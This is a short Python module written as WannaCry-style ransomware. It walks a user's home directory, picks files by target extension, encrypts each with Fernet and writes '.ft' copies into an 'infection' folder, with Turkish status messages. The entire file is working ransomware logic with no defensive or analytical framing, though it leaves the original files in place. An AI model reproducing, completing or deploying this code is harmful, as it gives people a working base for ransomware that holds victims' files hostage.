import os
from cryptography.fernet import Fernet


def GetTargets(homePath,WannacryTarget):
    matched_files = []

    for root, dirs, files in os.walk(homePath):
        for file in files:
            for ext in WannacryTarget:
                if file.lower().endswith(ext):
                    full_path = os.path.join(root, file)
                    matched_files.append(full_path)
    return matched_files

def encrypted(files, infectionPath, silent, key):
    cipher = Fernet(key)
    for file_path in files:
        try:
            with open(file_path, "rb") as f:
                data = f.read()

            encrypted_data = cipher.encrypt(data)

            relative_path = os.path.relpath(file_path, os.path.expanduser("~"))
            
            new_path = os.path.join(infectionPath, relative_path + ".ft")

            os.makedirs(os.path.dirname(new_path), exist_ok=True)

            with open(new_path, "wb") as f:
                f.write(encrypted_data)

            if not silent:
                print(f"{file_path} şifrelendi → {new_path}")
        except FileNotFoundError:
            print(f"❌ {file_path} dosyası bulunamadı, atlanıyor.")
            continue  # Dosya bulunamazsa hatayı atla ve bir sonraki dosyaya geç
        except Exception as e:
            print(f"❌ Hata: {str(e)}. {file_path} dosyası işlenemedi.")
            continue  # Diğer hatalarla karşılaşırsak, işlemi atla ve devam et

def start(homePath, silent, WannacryTarget, infectionPath, key):
    
    files = GetTargets(homePath, WannacryTarget)
    encrypted(files, infectionPath, silent, key)

